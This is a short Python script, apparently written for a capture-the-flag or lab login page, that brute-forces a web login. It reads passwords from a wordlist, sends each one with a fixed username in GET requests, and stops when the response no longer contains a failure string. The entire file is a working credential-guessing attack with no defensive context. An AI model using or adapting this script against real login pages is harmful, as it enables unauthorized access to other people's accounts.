import requests, sys, re

def testPassword(url, pwd):
    response = requests.get(url, params={
        'password': pwd,
        'username': 'GetThe',
        'Login': 'Login'
    })
    if 'WrongAnswer' not in response.text:
        print('Password found: ', pwd)
        return True
    return False

if __name__ == '__main__':
    args = sys.argv

    if len(args) < 2:
        print('Usage: python script.py <url>')

    baseUrl = args[1]

    with open("./pwds-list.txt") as file:
        for line in file:
            pwd = line.rstrip()
            if testPassword(baseUrl, pwd):
                break


